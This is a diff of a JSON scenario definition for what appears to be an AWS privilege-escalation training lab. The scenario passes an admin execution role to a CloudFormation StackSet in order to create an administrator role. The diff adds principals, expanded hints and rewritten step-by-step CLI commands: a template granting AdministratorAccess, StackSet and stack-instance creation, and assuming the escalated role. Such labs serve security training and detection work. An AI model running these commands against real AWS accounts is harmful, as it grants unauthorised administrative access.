@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances",
+  "displayName": "CloudFormation Stack Set Creation to Admin",
   "name": "cloudformation-003-iam-passrole+cloudformation-createstackset+cloudformation-createstackinstances",
   "description": "Passing administrative execution role to CloudFormation StackSet to create escalated IAM resources",
   "costEstimate": "$0/mo",
@@ -30,21 +30,24 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/cloudformation-003-iam-passrole+cloudformation-createstackset+cloudformation-createstackinstances"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/cloudformation-003-iam-passrole+cloudformation-createstackset+cloudformation-createstackinstances",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "iam:PassRole",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "resource": "arn:aws:iam::*:role/pl-prod-cloudformation-003-to-admin-execution-role",
         "description": "pass the privileged execution role to CloudFormation"
       },
       {
         "permission": "cloudformation:CreateStackSet",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "resource": "*",
         "description": "create a new StackSet configured with the execution role"
       },
       {
         "permission": "cloudformation:CreateStackInstances",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "resource": "*",
         "description": "deploy a stack instance to trigger resource creation"
       }
@@ -52,34 +55,42 @@
     "helpful": [
       {
         "permission": "cloudformation:DescribeStackSet",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "monitor StackSet creation progress"
       },
       {
         "permission": "cloudformation:DescribeStackSetOperation",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "check StackSet operation status"
       },
       {
         "permission": "cloudformation:ListStackInstances",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "list stack instances for cleanup"
       },
       {
         "permission": "cloudformation:DeleteStackInstances",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "delete stack instances during cleanup"
       },
       {
         "permission": "cloudformation:DeleteStackSet",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "clean up attack artifacts"
       },
       {
         "permission": "iam:ListRoles",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "discover available privileged roles to pass"
       },
       {
         "permission": "iam:GetRole",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "verify the escalated role was created"
       },
       {
         "permission": "sts:AssumeRole",
+        "principal": "pl-prod-cloudformation-003-to-admin-starting-user",
         "purpose": "assume the escalated role for admin access"
       }
     ]
@@ -155,27 +166,30 @@
         "label": "iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances",
         "description": "Create a CloudFormation StackSet passing the privileged execution role, then deploy a stack instance. CloudFormation assumes the execution role and creates the IAM resources defined in the template, including the escalated admin role.\n",
         "hints": [
-          "You have permissions related to CloudFormation and IAM role passing.",
-          "CloudFormation StackSets can create resources in an account using an execution role \u2014 look at what roles you can pass.",
-          "Create a StackSet with a template that defines an admin IAM role, passing the privileged execution role to perform the deployment.",
+          "You have permissions related to CloudFormation and IAM role passing -- look at what roles are available to you with iam:ListRoles.",
+          "Use iam:GetRole on roles with 'cloudformation-003' in their name to check what policies are attached to the execution role.",
+          "CloudFormation StackSets use an execution role to perform the actual resource creation -- if you can pass a role with AdministratorAccess, CloudFormation will act with those permissions.",
+          "Craft a CloudFormation template that creates an IAM role with AdministratorAccess and a trust policy granting your starting user sts:AssumeRole on it.",
+          "Create the StackSet using cloudformation:CreateStackSet, specifying the execution role name via the --execution-role-name parameter. Then deploy a stack instance with cloudformation:CreateStackInstances to trigger the resource creation.",
+          "Monitor the operation progress using cloudformation:DescribeStackSetOperation until the status reaches SUCCEEDED.",
           "Browse to https://pathfinding.cloud/paths/cloudformation-003 for technique details."
         ],
         "commands": [
           {
             "description": "Create a CloudFormation template defining an escalated admin role",
-            "command": "cat > /tmp/escalation-template.json << 'EOF'\n{\n  \"AWSTemplateFormatVersion\": \"2010-09-09\",\n  \"Resources\": {\n    \"EscalatedRole\": {\n      \"Type\": \"AWS::IAM::Role\",\n      \"Properties\": {\n        \"RoleName\": \"pl-prod-cloudformation-003-to-admin-escalated-role\",\n        \"AssumeRolePolicyDocument\": {\n          \"Version\": \"2012-10-17\",\n          \"Statement\": [{\"Effect\": \"Allow\", \"Principal\": {\"AWS\": \"arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-003-to-admin-starting-user\"}, \"Action\": \"sts:AssumeRole\"}]\n        },\n        \"ManagedPolicyArns\": [\"arn:aws:iam::aws:policy/AdministratorAccess\"]\n      }\n    }\n  }\n}\nEOF\n"
+            "command": "cat > /tmp/escalation-template.yaml << 'EOF'\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  EscalatedRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: pl-prod-cloudformation-003-to-admin-escalated-role\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              AWS: arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-003-to-admin-starting-user\n            Action: sts:AssumeRole\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AdministratorAccess\nEOF\n"
           },
           {
             "description": "Create the StackSet passing the privileged execution role",
-            "command": "aws cloudformation create-stack-set --stack-set-name pl-cf003-escalation --template-body file:///tmp/escalation-template.json --execution-role-name pl-prod-cloudformation-003-to-admin-execution-role --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/AWSCloudFormationStackSetAdministrationRole"
+            "command": "aws cloudformation create-stack-set --stack-set-name pl-prod-cloudformation-003-escalation-stackset --template-body file:///tmp/escalation-template.yaml --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-admin-role --execution-role-name pl-prod-cloudformation-003-to-admin-execution-role --capabilities CAPABILITY_NAMED_IAM"
           },
           {
             "description": "Deploy a stack instance to create the escalated role",
-            "command": "aws cloudformation create-stack-instances --stack-set-name pl-cf003-escalation --accounts ACCOUNT_ID --regions us-east-1 --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1"
+            "command": "aws cloudformation create-stack-instances --stack-set-name pl-prod-cloudformation-003-escalation-stackset --accounts ACCOUNT_ID --regions us-east-1 --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1 --query 'OperationId' --output text"
           },
           {
             "description": "Wait for the stack instance operation to complete",
-            "command": "aws cloudformation describe-stack-set-operation --stack-set-name pl-cf003-escalation --operation-id OPERATION_ID"
+            "command": "aws cloudformation describe-stack-set-operation --stack-set-name pl-prod-cloudformation-003-escalation-stackset --operation-id OPERATION_ID --query 'StackSetOperation.Status' --output text"
           }
         ]
       },
@@ -185,17 +199,18 @@
         "label": "sts:AssumeRole",
         "description": "Once the StackSet operation completes, assume the newly created escalated role to gain full administrative access to the AWS account.\n",
         "hints": [
-          "The StackSet uses the execution role you passed to create resources \u2014 what IAM resources could you have it create?",
-          "Define a CloudFormation template that creates an IAM role with AdministratorAccess and a trust policy allowing your starting user to assume it."
+          "Once the StackSet operation status shows SUCCEEDED, the IAM role defined in your template has been created -- use iam:GetRole to confirm it exists.",
+          "The newly created role has a trust policy allowing your starting user to assume it -- you already have sts:AssumeRole permission.",
+          "Assume the escalated role and export the returned session credentials to verify you now have administrative access."
         ],
         "commands": [
           {
             "description": "Assume the escalated admin role",
-            "command": "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-escalated-role --role-session-name escalation-session"
+            "command": "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-003-to-admin-escalated-role --role-session-name escalation-session --query 'Credentials' --output json"
           },
           {
             "description": "Verify administrative access",
-            "command": "aws iam list-users"
+            "command": "aws iam list-users --max-items 3 --output table"
           }
         ]
       }
